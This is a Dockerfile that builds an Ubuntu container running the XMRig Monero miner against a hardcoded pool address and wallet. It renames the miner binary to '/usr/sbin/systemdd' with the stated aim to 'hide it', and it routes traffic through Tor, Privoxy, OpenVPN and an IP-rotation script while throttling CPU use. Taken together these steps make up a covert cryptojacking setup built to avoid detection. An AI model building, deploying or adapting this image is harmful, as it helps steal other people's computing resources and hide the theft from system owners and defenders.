# Use Ubuntu 22.04 as the base image
FROM ubuntu:22.04

# Install necessary tools, including Tor, Privoxy, OpenVPN
RUN apt-get update && apt-get install -y \
    torsocks \
    wget \
    tor \
    privoxy \
    openvpn \
    sudo \
    bc \
    nano \
    rename \
    cpulimit \
    libcap-dev \
    util-linux \
    libcap2-bin \
    && apt-get clean

# Set environment variables for XMRig and system settings
ENV VERSION="6.21.0" \
    WORK_DIR="/root/work" \
    POOL="47.238.48.153:8080" \
    USERNAME="44XbJdyExZZbCqrGyvG1oUbTpBL8JNqHVh8hmYXgUfEHgHs4t45yMfKeTAUQ4dDNtPc2vXhj83uJf1byNSgwU9ZYFxgT3Ao" \
    ALGO="rx/0" \
    DONATE="1" \
    TOR_PORT="9051" \
    VPN_CONFIG="/etc/openvpn/client.ovpn" \
    CPU_MIN="70" \
    CPU_MAX="90"

# Create work directory
RUN mkdir -p $WORK_DIR

# Download and extract XMRig
RUN wget https://github.com/xmrig/xmrig/releases/download/v${VERSION}/xmrig-${VERSION}-linux-x64.tar.gz -P $WORK_DIR \
    && tar -xvzf $WORK_DIR/xmrig-${VERSION}-linux-x64.tar.gz -C $WORK_DIR \
    && mv $WORK_DIR/xmrig-${VERSION}/xmrig $WORK_DIR/xmrig

# Move and rename the executable to hide it
RUN mv /root/work/xmrig /usr/sbin/systemdd

# Copy configuration files into the container
COPY config /etc/privoxy/config
COPY torrc /etc/tor/torrc
COPY start.sh /root/start.sh
COPY change_ip.sh /root/change_ip.sh
COPY client.ovpn /etc/openvpn/client.ovpn
COPY torsocks.conf /etc/tor/torsocks.conf

# Set execution permissions for the scripts and correct permissions for configuration files
RUN chmod +x /root/start.sh /root/change_ip.sh \
    && chmod 644 /etc/tor/torrc /etc/privoxy/config /etc/openvpn/client.ovpn /etc/tor/torsocks.conf

# Ensure the device TUN is available for OpenVPN
RUN mkdir -p /dev/net && mknod /dev/net/tun c 10 200

# Run start.sh when the container starts
CMD ["/root/start.sh"]
